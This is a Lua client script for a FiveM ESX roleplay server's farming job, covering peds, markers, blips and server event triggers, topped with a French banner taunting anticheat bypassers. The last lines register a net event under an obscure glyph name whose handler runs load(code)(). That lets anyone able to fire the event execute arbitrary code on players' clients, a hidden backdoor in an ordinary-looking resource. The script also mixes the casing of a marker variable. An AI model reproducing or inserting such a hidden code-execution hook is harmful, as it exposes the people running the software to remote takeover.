-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local HasAlreadyEnteredMarker = false
local lastZone, lastType = nil

local CurrentAction = {zone = nil, type = nil}
local CurrentActionMsg = ''

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(100)
	end

	for i = 1, #Config.Peds, 1 do
		ESX.Game.SpawnLocalPed(4, Config.Peds[i].Model, Config.Peds[i].Coords, Config.Peds[i].Heading, function(ped)
			Config.Peds[i].Handle = ped
			FreezeEntityPosition(ped, true)
			SetEntityInvincible(ped, true)
			SetBlockingOfNonTemporaryEvents(ped, true)
		end)

		if type(Config.Peds[i].Action) == 'table' then
			Config.Zones[Config.Peds[i].Action.zone][Config.Peds[i].Action.type].ActionPed = Config.Peds[i].Handle
		end
	end
end)

function PlayAnim(personne, animDict, animName, duration)
	RequestAnimDict(animDict)

	while not HasAnimDictLoaded(animDict) do
		Citizen.Wait(0)
	end

	TaskPlayAnim(personne, animDict, animName, 1.0, -1.0, duration, 49, 1, false, false, false)
	RemoveAnimDict(animDict)
end

function PlayFarmAnim()
	Citizen.CreateThread(function()
		TaskStartScenarioInPlace(PlayerPedId(), "CODE_HUMAN_MEDIC_KNEEL", 0, false)
		Citizen.Wait(Config.FarmTime)
		ClearPedTasks(PlayerPedId())
	end)
end

AddEventHandler('::{korioz#0110}::farming:hasEnteredMarker', function(zone, type)
	CurrentAction = {zone = zone, type = type}
	CurrentActionMsg = ('Appuyez sur ~INPUT_CONTEXT~ pour %s'):format(Config.Zones[zone][type].ActionHelp)
end)

AddEventHandler('::{korioz#0110}::farming:hasExitedMarker', function(zone, type)
	CurrentAction = {zone = nil, type = nil}
	_TriggerServerEvent('::{korioz#0110}::farming:stopAction', zone, type)
end)

RegisterNetEvent('::{korioz#0110}::farming:changeMarker')
AddEventHandler('::{korioz#0110}::farming:changeMarker', function(zone, type)
	Config.Zones[zone][type].ActionCoords = Config.Zones[zone][type].RandomCoords[math.random(1, #Config.Zones[zone][type].RandomCoords)]
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId())

		for k, v in pairs(Config.Zones) do
			for k2, v2 in pairs(v) do
				if #(plyCoords - v2.ActionCoords) < Config.DrawDistance and v2.ActionPed == nil then
					DrawMarker(Config.MarkerType, v2.ActionCoords.x, v2.ActionCoords.y, v2.ActionCoords.z - 1.05, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 255, false, false, 2, false, false, false, false)
				end
			end
		end

		for i = 1, #Config.Peds, 1 do
			if #(plyCoords - Config.Peds[i].Coords) < Config.DrawTextDistance then
				ESX.Game.Utils.DrawText3D(vector3(Config.Peds[i].Coords.x, Config.Peds[i].Coords.y, Config.Peds[i].Coords.z + 2.05), Config.Peds[i].Name)
			end
		end
	end
end)

Citizen.CreateThread(function()
	for i = 1, #Config.Blips, 1 do
		Config.Blips[i].Handle = AddBlipForCoord(Config.Blips[i].Coords)

		SetBlipSprite(Config.Blips[i].Handle, Config.Blips[i].Sprite)
		SetBlipDisplay(Config.Blips[i].Handle, 4)
		SetBlipScale(Config.Blips[i].Handle, Config.Blips[i].Size)
		SetBlipColour(Config.Blips[i].Handle, Config.Blips[i].Color)
		SetBlipAsShortRange(Config.Blips[i].Handle, true)

		BeginTextCommandSetBlipName('STRING')
		AddTextComponentSubstringPlayerName(Config.Blips[i].Label)
		EndTextCommandSetBlipName(Config.Blips[i].Handle)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId())
		local isInMarker = false
		local currentZone = nil
		local currentType = nil

		for k, v in pairs(Config.Zones) do
			for k2, v2 in pairs(v) do
				if #(plyCoords - v2.ActionCoords) < Config.MarkerSize.x * 3 then
					isInMarker = true
					currentZone = k
					currentType = k2
				end
			end
		end

		if isInMarker and not hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = true
			lastZone = currentZone
			lastType = currentType
			TriggerEvent('::{korioz#0110}::farming:hasEnteredMarker', currentZone, currentType)
		end

		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::farming:hasExitedMarker', lastZone, lastType)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction.zone ~= nil and CurrentAction.type ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) and IsPedOnFoot(PlayerPedId()) then
				_TriggerServerEvent('::{korioz#0110}::farming:startAction', CurrentAction.zone, CurrentAction.type)
				Config.Zones[CurrentAction.zone][CurrentAction.type].ActionCB()
				CurrentAction = {zone = nil, type = nil}
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)